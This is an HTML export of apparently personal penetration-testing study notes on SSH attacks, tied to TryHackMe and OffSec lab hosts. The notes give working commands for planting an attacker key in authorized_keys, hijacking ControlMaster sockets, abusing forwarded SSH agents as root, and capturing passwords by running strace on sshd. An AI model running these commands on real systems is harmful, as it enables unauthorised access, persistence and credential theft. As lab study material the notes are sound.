<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SSH hijacking</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>SSH hijacking</h1><br/><p><h2>SSH jump server</h2><ul><li><h2>• </h2>• ssh tony.holland@za.tryhackme.com@thmjmp2.za.tryhackme.com</li></ul></p><p><h2>Locating private keys</h2><ul><li>~/.ssh/known_hosts: machines connected to via ssh recently <ul><li>HashKnownHosts enabled in /etc/ssh/ssh_config means entries are hashed </li></ul></li><li>tail ~/.bash_history</li></ul></p><p></p><p></p><p><h2>SSH persistence</h2><ul><li>insert our public key into ~/.ssh/authorized_keys</li><li>echo &quot;ssh-rsa AAAAB3NzaC1yc2E....ANSzp9EPhk4cIeX8= kali@kali&quot; &gt;&gt; /home/linuxvictim/.ssh/authorized_keys</li></ul></p><p></p><p></p><p><h2>SSH Hijacking with ControlMaster: lateral movement</h2></p><p><ul><li>• <small>• </small><small>Goal</small><small>: move to another machine by hijacking ssh connection of a legitimate user </small></li><li><small>ssh control master allow multiple sessions over the same SSH connection</small><ul><li><small>stealing ssh connection of your user to another machine</small></li></ul></li><li>enable ControlMaster in ~/.ssh/config<ul><li></li></ul></li></ul><img src="images/26-1.png" alt="images/26-1.png" /><ul><li>controlpersist = accept new connections for a certain amount of time </p><p></li></ul><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># ~/.ssh/config</span><br />Host *<br />        ControlPath ~/.ssh/controlmaster/%r@%h:%p<br />        ControlMaster auto<br />        ControlPersist 10m<br /><br /><br /><span style="color:#0088ff;font-weight:400"># $mkdir ~/.ssh/controlmaster</span><br /><span style="color:#0088ff;font-weight:400"># $ chmod 644 ~/.ssh/config</span><br /><br /><span style="color:#0088ff;font-weight:400"># wait for the user to connect to another server </span><br /><span style="color:#0088ff;font-weight:400"># we should find a socket file on controlmaster dir </span><br /><span style="color:#ff9d00;font-weight:700">ssh</span> offsec@linuxvictim<br /><br /><span style="color:#0088ff;font-weight:400">## if root</span><br /><span style="color:#ff9d00;font-weight:700">ssh</span> -S /home/<span style="color:#7f0044;font-weight:400">$user</span>/.ssh/controlmaster/<span style="color:#ff9d00;font-weight:700">&lt;</span>oscketfile<span style="color:#ff9d00;font-weight:700">&gt;</span> offsec@linuxvictim </pre></div><ul><li>exploit<ul><li>if cron job is running watch for socket file and then  hijack it <ul><li>ls -la .ssh/controlmaster</li></ul></li></ul></li></ul></p><p></p><p></p><p><h2>Exploit ssh agent forwarding</h2><ul><li><small>SSH-Agent</small><small> is a utility that keeps track of a user’s private keys and allows them to be used without having to repeat their passphrases on every connection</small></li><li><small>SSH agent forwarding is a mechanism that allows a user to use the SSH-Agent on an intermediate server as if it were their own local agent on their originating machine</small></li><li>Practical 1</p><p></li></ul><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">## install ssh key on intermediate and dest machines</span><br />kali@kali:~$ ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@controller<br />kali@kali:~$ ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@linuxvictim<br /><br /><span style="color:#0088ff;font-weight:400"># enable agent forwarding on kali machine and start ssh-agent </span><br /><span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#3ad900;font-weight:400">&quot;ForwardAgent yes&quot;</span> <span style="color:#ff9d00;font-weight:700">&gt;&gt;</span> ~/.ssh/config<br /><span style="color:#ff9d00;font-weight:700">eval</span> <span style="color:#333333;font-weight:400">`ssh-agent`</span><br /><span style="color:#0088ff;font-weight:400">## allows the intermediate server to forward key challenges back to the originating client’s SSH agent.</span><br /><span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#3ad900;font-weight:400">&quot;AllowAgentForwarding yes&quot;</span> <span style="color:#ff9d00;font-weight:700">&gt;&gt;</span> /etc/ssh/sshd_config<br /><br /><span style="color:#0088ff;font-weight:400">## we can add the key to the kali vm if we want to use the key in default location</span><br /><span style="color:#ff9d00;font-weight:700">ssh-add</span><br /><span style="color:#ff9d00;font-weight:700">ssh</span> offsec@controller<br /><span style="color:#0088ff;font-weight:400"># in intermediate</span><br /><span style="color:#ff9d00;font-weight:700">ssh</span> offsec@linuxvictim</pre></div><ul><li>Practical 2 (in case of high privileged users)</p><p></li></ul><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># find open ssh connection</span><br />pstree -p offsec <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> sshd<br /><span style="color:#ff9d00;font-weight:700">cat</span> /proc/<span style="color:#7f0044;font-weight:400">$pid</span>/environ<br /><br /><span style="color:#0088ff;font-weight:400"># on the intermediate as root</span><br /><span style="color:#7f0044;font-weight:400">SSH_AUTH_SOCK</span>=<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>xxxxxx<span style="color:#ff9d00;font-weight:700">/</span>agent.xxxx <span style="color:#ff9d00;font-weight:700">ssh-add</span> -l<br /><span style="color:#7f0044;font-weight:400">SSH_AUTH_SOCK</span>=<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>xxxxxx<span style="color:#ff9d00;font-weight:700">/</span>agent.xxxx <span style="color:#ff9d00;font-weight:700">ssh</span> offsec@linuxvictim<br /></pre></div></p><p></p><p></p><p><h2>Spying on ssh password using strace</h2></p><p><ul><li><a href="https://medium.com/@deboj88/spaying-on-ssh-password-using-strace-7465ede0a5cc">https://medium.com/@deboj88/spaying-on-ssh-password-using-strace-7465ede0a5cc</a></li><li>ps aux | grep ssh</li><li>sudo strace -p $pid</li><li>tcpdump -i ens160 -w capture_file_admin01</li></ul></p><p>sudo strace -f -p $(pgrep -f &quot;/usr/sbin/sshd&quot;) -s 128 -o auth.log</p></div>
</body>
</html>
